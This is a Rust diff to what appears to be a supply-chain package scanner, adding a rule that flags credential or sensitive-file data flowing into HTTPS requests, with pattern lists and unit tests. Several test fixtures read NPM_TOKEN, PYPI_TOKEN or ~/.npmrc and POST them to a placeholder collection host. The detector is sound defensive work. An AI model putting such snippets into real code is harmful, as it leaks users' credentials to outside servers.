@@ -34,6 +34,7 @@ pub enum ArtifactFindingCategory {
     EnvironmentExfiltrationCapability,
     CredentialExfiltrationCapability,
     SensitiveFileExfiltrationCapability,
+    HttpsSensitiveExfiltrationCapability,
     DownloadExecuteCapability,
     EnvironmentToProcessCapability,
 }
@@ -49,6 +50,9 @@ impl ArtifactFindingCategory {
             Self::EnvironmentExfiltrationCapability => "environment_exfiltration_capability",
             Self::CredentialExfiltrationCapability => "credential_exfiltration_capability",
             Self::SensitiveFileExfiltrationCapability => "sensitive_file_exfiltration_capability",
+            Self::HttpsSensitiveExfiltrationCapability => {
+                "https_sensitive_exfiltration_capability"
+            }
             Self::DownloadExecuteCapability => "download_execute_capability",
             Self::EnvironmentToProcessCapability => "environment_to_process_capability",
         }
@@ -1492,6 +1496,7 @@ enum CapabilityKind {
     Network,
     Process,
     DownloadExecute,
+    HttpsSensitiveExfiltration,
 }
 
 #[derive(Debug, Clone)]
@@ -1572,6 +1577,12 @@ fn run_behavior_rules(
                     ArtifactFindingSeverity::High,
                     "One trigger-reachable file contains a concrete network source, a later staged-file write, and a process invocation of that same staged path.",
                 ),
+                CapabilityKind::HttpsSensitiveExfiltration => (
+                    "WT-HTTPS-SENSITIVE-EXFIL-001",
+                    ArtifactFindingCategory::HttpsSensitiveExfiltrationCapability,
+                    ArtifactFindingSeverity::Critical,
+                    "One trigger-reachable file contains a bounded lexical data flow from a credential environment value or sensitive-file read into a concrete HTTPS request.",
+                ),
             };
             findings.push(make_finding(
                 artifact,
@@ -1635,6 +1646,9 @@ fn scan_capabilities(file: &NormalizedMemberContent) -> Vec<CapabilityMatch> {
     }
     if let Some(range) = staged_download_execute_range(text) {
         found.insert(CapabilityKind::DownloadExecute, range);
+    }
+    if let Some(range) = https_sensitive_exfiltration_range(text) {
+        found.insert(CapabilityKind::HttpsSensitiveExfiltration, range);
     }
     found
         .into_iter()
@@ -1739,10 +1753,20 @@ fn make_finding(
             &file.bytes()[start as usize..end as usize],
         ),
     };
-    let mut limitations = vec![
-        "lexical_rule_does_not_establish_runtime_values_or_destination".to_string(),
-        "static_capability_is_not_proof_of_execution".to_string(),
-    ];
+    let mut limitations = if category
+        == ArtifactFindingCategory::HttpsSensitiveExfiltrationCapability
+    {
+        vec![
+            "same_file_bounded_lexical_dataflow_only".to_string(),
+            "static_capability_is_not_proof_of_execution".to_string(),
+            "https_sink_does_not_prove_delivery".to_string(),
+        ]
+    } else {
+        vec![
+            "lexical_rule_does_not_establish_runtime_values_or_destination".to_string(),
+            "static_capability_is_not_proof_of_execution".to_string(),
+        ]
+    };
     if graph
         .surfaces
         .iter()
@@ -2508,6 +2532,403 @@ fn sensitive_path_access(line: &str) -> bool {
         && first_pattern(line, FILE_ACCESS_PATTERNS).is_some()
 }
 
+const WHOLE_ENVIRONMENT_PATTERNS: &[&str] = &[
+    "JSON.stringify(process.env",
+    "Object.assign({}, process.env",
+    "Object.entries(process.env",
+    "Object.keys(process.env",
+    "Object.values(process.env",
+    "...process.env",
+    "dict(os.environ",
+    "os.environ.copy(",
+];
+
+const HTTPS_API_PATTERNS: &[&str] = &[
+    "https.request(",
+    "https.get(",
+    "require('https').request(",
+    "require(\"https\").request(",
+    "require('node:https').request(",
+    "require(\"node:https\").request(",
+    "require('https').get(",
+    "require(\"https\").get(",
+    "require('node:https').get(",
+    "require(\"node:https\").get(",
+];
+
+const HTTPS_CLIENT_PATTERNS: &[&str] = &[
+    "fetch(",
+    "globalThis.fetch(",
+    "axios.get(",
+    "axios.post(",
+    "axios.request(",
+    "got(",
+    "requests.get(",
+    "requests.post(",
+    "requests.request(",
+    "httpx.get(",
+    "httpx.post(",
+    "urllib.request.urlopen(",
+    "urllib.request.urlretrieve(",
+    "curl ",
+    "wget ",
+];
+
+#[derive(Debug, Clone, Copy)]
+struct LexicalStatement<'a> {
+    text: &'a str,
+    start_byte: usize,
+    start_line: usize,
+}
+
+#[derive(Debug, Clone, Copy)]
+struct SensitiveFlowOrigin {
+    byte: usize,
+    line: usize,
+}
+
+/// Recognizes a deliberately narrow, same-file lexical data flow from a credential-bearing
+/// environment read or sensitive-file read into a concrete HTTPS request. Merely placing a
+/// source and a network API in one reachable closure is insufficient: a source expression (or a
+/// variable transitively assigned from it) must reach the HTTPS call or the write/end operation
+/// on a handle returned by an HTTPS request call.
+fn https_sensitive_exfiltration_range(text: &str) -> Option<EvidenceRange> {
+    let mut tainted = BTreeMap::<String, SensitiveFlowOrigin>::new();
+    let mut https_urls = BTreeSet::<String>::new();
+    let mut https_request_handles = BTreeSet::<String>::new();
+
+    for statement in lexical_statements(text) {
+        let trimmed = statement.text.trim_start();
+        if trimmed.is_empty()
+            || trimmed.starts_with("//")
+            || trimmed.starts_with('#')
+        {
+            continue;
+        }
+        if begins_lexical_function_scope(trimmed) {
+            tainted.clear();
+            https_urls.clear();
+            https_request_handles.clear();
+        }
+
+        let direct_source = sensitive_source_offset(statement.text).map(|offset| {
+            SensitiveFlowOrigin {
+                byte: statement.start_byte + offset,
+                line: statement.start_line
+                    + statement.text[..offset]
+                        .bytes()
+                        .filter(|byte| *byte == b'\n')
+                        .count(),
+            }
+        });
+        let assignment = assignment_binding(statement.text);
+        let flow_text = assignment
+            .as_ref()
+            .map(|(_, rhs_start)| &statement.text[*rhs_start..])
+            .unwrap_or(statement.text);
+        let referenced_source = earliest_referenced_origin(flow_text, &tainted);
+        let flow_source = match (direct_source, referenced_source) {
+            (Some(left), Some(right)) => Some(if left.byte <= right.byte { left } else { right }),
+            (Some(origin), None) | (None, Some(origin)) => Some(origin),
+            (None, None) => None,
+        };
+
+        if let Some((identifier, _)) = assignment.as_ref() {
+            if let Some(origin) = flow_source {
+                tainted.insert(identifier.clone(), origin);
+            } else {
+                tainted.remove(identifier);
+            }
+            if statement.text.contains("https://")
+                || https_urls
+                    .iter()
+                    .any(|candidate| identifier_referenced(statement.text, candidate))
+            {
+                https_urls.insert(identifier.clone());
+            }
+        }
+
+        let direct_https = first_code_pattern(statement.text, HTTPS_API_PATTERNS).is_some();
+        let generic_https = first_code_pattern(statement.text, HTTPS_CLIENT_PATTERNS).is_some()
+            && (statement.text.contains("https://")
+                || https_urls
+                    .iter()
+                    .any(|identifier| identifier_referenced(statement.text, identifier)));
+        if direct_https {
+            if let Some((identifier, _)) = assignment.as_ref() {
+                // The assigned value is a request handle, not the sensitive payload that may
+                // have appeared in its options. Track it only as a protected HTTPS handle.
+                tainted.remove(identifier);
+                https_request_handles.insert(identifier.clone());
+            }
+        }
+        let handle_write = https_request_handles.iter().any(|identifier| {
+            statement.text.contains(&format!("{identifier}.write("))
+                || statement.text.contains(&format!("{identifier}.end("))
+        });
+        let sensitive_data_sink = handle_write
+            || (direct_https && direct_https_statement_carries_data(statement.text))
+            || (generic_https && generic_https_statement_carries_data(statement.text));
+        if sensitive_data_sink && flow_source.is_some() {
+            let source = flow_source.expect("checked above");
+            let end_byte = statement
+                .text
+                .trim_end_matches(['\r', '\n'])
+                .len()
+                .checked_add(statement.start_byte)?;
+            if source.byte < end_byte {
+                let end_line = statement.start_line
+                    + statement.text[..end_byte - statement.start_byte]
+                        .bytes()
+                        .filter(|byte| *byte == b'\n')
+                        .count();
+                return Some(EvidenceRange::Lines {
+                    start_line: source.line as u64 + 1,
+                    end_line: end_line as u64 + 1,
+                    start_byte: source.byte as u64,
+                    end_byte: end_byte as u64,
+                });
+            }
+        }
+    }
+    None
+}
+
+fn lexical_statements(text: &str) -> Vec<LexicalStatement<'_>> {
+    let bytes = text.as_bytes();
+    let mut statements = Vec::new();
+    let mut start_byte = 0usize;
+    let mut start_line = 0usize;
+    let mut line = 0usize;
+    let mut quote = None;
+    let mut escaped = false;
+    for (index, byte) in bytes.iter().copied().enumerate() {
+        if let Some(active_quote) = quote {
+            if escaped {
+                escaped = false;
+            } else if byte == b'\\' {
+                escaped = true;
+            } else if byte == active_quote {
+                quote = None;
+            }
+        } else if matches!(byte, b'\'' | b'"' | b'`') {
+            quote = Some(byte);
+        }
+        let boundary = quote.is_none() && matches!(byte, b';' | b'\n');
+        if boundary {
+            let end_byte = index + 1;
+            statements.push(LexicalStatement {
+                text: &text[start_byte..end_byte],
+                start_byte,
+                start_line,
+            });
+            start_byte = end_byte;
+            if byte == b'\n' {
+                line += 1;
+            }
+            start_line = line;
+        } else if byte == b'\n' {
+            line += 1;
+        }
+    }
+    if start_byte < bytes.len() {
+        statements.push(LexicalStatement {
+            text: &text[start_byte..],
+            start_byte,
+            start_line,
+        });
+    }
+    statements
+}
+
+fn begins_lexical_function_scope(text: &str) -> bool {
+    text.starts_with("def ")
+        || text.starts_with("async def ")
+        || text.starts_with("function ")
+        || text.starts_with("async function ")
+        || text.contains("\ndef ")
+        || text.contains("\nasync def ")
+        || text.contains("\nfunction ")
+        || text.contains("\nasync function ")
+        || text.contains("}function ")
+        || text.contains("} function ")
+        || ((text.starts_with("const ") || text.starts_with("let ") || text.starts_with("var "))
+            && text.contains("=>"))
+}
+
+fn sensitive_source_offset(text: &str) -> Option<usize> {
+    if first_code_pattern(text, ENVIRONMENT_PATTERNS).is_some()
+        && first_pattern(text, CREDENTIAL_NAME_PATTERNS).is_some()
+    {
+        return first_code_pattern(text, ENVIRONMENT_PATTERNS).map(|(offset, _)| offset);
+    }
+    if first_code_pattern(text, FILE_ACCESS_PATTERNS).is_some()
+        && first_pattern(text, SENSITIVE_PATH_PATTERNS).is_some()
+    {
+        return first_code_pattern(text, FILE_ACCESS_PATTERNS).map(|(offset, _)| offset);
+    }
+    first_code_pattern(text, WHOLE_ENVIRONMENT_PATTERNS).map(|(offset, _)| offset)
+}
+
+fn assignment_binding(text: &str) -> Option<(String, usize)> {
+    let bytes = text.as_bytes();
+    let assignment = bytes.iter().enumerate().find_map(|(index, byte)| {
+        if *byte != b'=' {
+            return None;
+        }
+        let before = index.checked_sub(1).and_then(|value| bytes.get(value)).copied();
+        let after = bytes.get(index + 1).copied();
+        (!matches!(before, Some(b'=' | b'!' | b'<' | b'>'))
+            && !matches!(after, Some(b'=' | b'>')))
+        .then_some(index)
+    })?;
+    let left = text[..assignment].trim_end();
+    let start = left
+        .char_indices()
+        .rev()
+        .take_while(|(_, character)| character.is_ascii_alphanumeric() || *character == '_')
+        .last()
+        .map(|(index, _)| index)?;
+    let identifier = &left[start..];
+    if identifier.is_empty()
+        || identifier.len() > 128
+        || !identifier
+            .bytes()
+            .next()
+            .is_some_and(|byte| byte.is_ascii_alphabetic() || byte == b'_')
+        || left[..start].trim_end().ends_with(['.', ']'])
+    {
+        return None;
+    }
+    Some((identifier.to_string(), assignment + 1))
+}
+
+fn earliest_referenced_origin(
+    text: &str,
+    tainted: &BTreeMap<String, SensitiveFlowOrigin>,
+) -> Option<SensitiveFlowOrigin> {
+    tainted
+        .iter()
+        .filter(|(identifier, _)| identifier_referenced(text, identifier))
+        .map(|(_, origin)| *origin)
+        .min_by_key(|origin| origin.byte)
+}
+
+fn identifier_referenced(text: &str, identifier: &str) -> bool {
+    text.match_indices(identifier).any(|(start, _)| {
+        let before = text[..start].bytes().next_back();
+        let end = start + identifier.len();
+        let after = text[end..].bytes().next();
+        !before.is_some_and(is_identifier_character)
+            && !after.is_some_and(is_identifier_character)
+    })
+}
+
+fn is_identifier_character(byte: u8) -> bool {
+    byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'$')
+}
+
+fn first_code_pattern<'a>(text: &str, patterns: &'a [&'a str]) -> Option<(usize, &'a str)> {
+    let bytes = text.as_bytes();
+    let mut index = 0usize;
+    let mut quote = None;
+    let mut escaped = false;
+    let mut line_comment = false;
+    let mut block_comment = false;
+    while index < bytes.len() {
+        let byte = bytes[index];
+        if line_comment {
+            if byte == b'\n' {
+                line_comment = false;
+            }
+            index += 1;
+            continue;
+        }
+        if block_comment {
+            if byte == b'*' && bytes.get(index + 1) == Some(&b'/') {
+                block_comment = false;
+                index += 2;
+            } else {
+                index += 1;
+            }
+            continue;
+        }
+        if let Some(active_quote) = quote {
+            if escaped {
+                escaped = false;
+            } else if byte == b'\\' {
+                escaped = true;
+            } else if byte == active_quote {
+                quote = None;
+            }
+            index += 1;
+            continue;
+        }
+        if matches!(byte, b'\'' | b'"' | b'`') {
+            quote = Some(byte);
+            index += 1;
+            continue;
+        }
+        if byte == b'/' && bytes.get(index + 1) == Some(&b'/') {
+            line_comment = true;
+            index += 2;
+            continue;
+        }
+        if byte == b'/' && bytes.get(index + 1) == Some(&b'*') {
+            block_comment = true;
+            index += 2;
+            continue;
+        }
+        if let Some(pattern) = patterns
+            .iter()
+            .copied()
+            .filter(|pattern| text[index..].starts_with(pattern))
+            .min_by_key(|pattern| pattern.len())
+        {
+            return Some((index, pattern));
+        }
+        index += 1;
+    }
+    None
+}
+
+fn direct_https_statement_carries_data(text: &str) -> bool {
+    (text.contains(".write(") || text.contains(".end("))
+        || ((text.contains("https.get(") || text.contains(".get("))
+            && text.contains('?'))
+}
+
+fn generic_https_statement_carries_data(text: &str) -> bool {
+    if ["axios.post(", "requests.post(", "httpx.post("]
+        .iter()
+        .any(|pattern| text.contains(pattern))
+    {
+        return true;
+    }
+    if text.contains("fetch(") || text.contains("globalThis.fetch(") {
+        return text.contains("body") || text.contains('?');
+    }
+    if [
+        "axios.request(",
+        "requests.request(",
+        "urllib.request.urlopen(",
+        "got(",
+    ]
+    .iter()
+    .any(|pattern| text.contains(pattern))
+    {
+        return ["body", "data", "json", "content", "form"]
+            .iter()
+            .any(|marker| text.contains(marker));
+    }
+    if text.contains("curl ") || text.contains("wget ") {
+        return ["--data", "--form", "--post-data", " -d ", " -F "]
+            .iter()
+            .any(|marker| text.contains(marker));
+    }
+    text.contains('?')
+}
+
 fn staged_download_execute_range(text: &str) -> Option<EvidenceRange> {
     let mut network_source = None;
     let mut staged_targets = BTreeMap::new();
@@ -2857,5 +3278,80 @@ def fetch_and_launch():
         let plain = "const documented = 'NPM_TOKEN';";
         assert!(first_pattern(plain, CREDENTIAL_NAME_PATTERNS).is_some());
         assert!(first_pattern(plain, ENVIRONMENT_PATTERNS).is_none());
+    }
+
+    #[test]
+    fn https_sensitive_exfiltration_requires_a_bounded_data_flow() {
+        let direct = r#"const token = process.env.NPM_TOKEN;
+fetch('https://example.invalid/collect', {method: 'POST', body: token});
+"#;
+        assert!(https_sensitive_exfiltration_range(direct).is_some());
+
+        let propagated = r#"const config = fs.readFileSync(home + '/.npmrc');
+const payload = JSON.stringify({config});
+const request = https.request({method: 'POST'});
+request.write(payload);
+request.end();
+"#;
+        assert!(https_sensitive_exfiltration_range(propagated).is_some());
+
+        let python = r#"token = os.environ["PYPI_TOKEN"]
+payload = {"token": token}
+requests.post("https://example.invalid/collect", json=payload)
+"#;
+        assert!(https_sensitive_exfiltration_range(python).is_some());
+
+        let unrelated = r#"const token = process.env.NPM_TOKEN;
+console.log(token.length);
+fetch('https://example.invalid/status');
+"#;
+        assert_eq!(https_sensitive_exfiltration_range(unrelated), None);
+
+        let cleartext = r#"const token = process.env.NPM_TOKEN;
+fetch('http://example.invalid/collect', {method: 'POST', body: token});
+"#;
+        assert_eq!(https_sensitive_exfiltration_range(cleartext), None);
+
+        let ordinary_environment = r#"const mode = process.env.NODE_ENV;
+fetch('https://example.invalid/metrics', {method: 'POST', body: mode});
+"#;
+        assert_eq!(https_sensitive_exfiltration_range(ordinary_environment), None);
+
+        let overwritten = r#"let payload = process.env.NPM_TOKEN;
+payload = 'public-status';
+fetch('https://example.invalid/metrics', {method: 'POST', body: payload});
+"#;
+        assert_eq!(https_sensitive_exfiltration_range(overwritten), None);
+
+        let header_only = r#"const token = process.env.NPM_TOKEN;
+const request = https.request({headers: {authorization: token}});
+request.end();
+"#;
+        assert_eq!(https_sensitive_exfiltration_range(header_only), None);
+
+        let source_example_string = r#"const example = 'process.env.NPM_TOKEN';
+axios.post('https://example.invalid/docs', example);
+"#;
+        assert_eq!(
+            https_sensitive_exfiltration_range(source_example_string),
+            None
+        );
+    }
+
+    #[test]
+    fn https_sensitive_exfiltration_does_not_cross_function_scopes_by_name() {
+        let separate_functions = r#"function readCredential() {
+  const payload = process.env.NPM_TOKEN;
+  console.log(payload.length);
+}
+function sendHealthCheck() {
+  const payload = 'healthy';
+  fetch('https://example.invalid/status', {method: 'POST', body: payload});
+}
+"#;
+        assert_eq!(
+            https_sensitive_exfiltration_range(separate_functions),
+            None
+        );
     }
 }
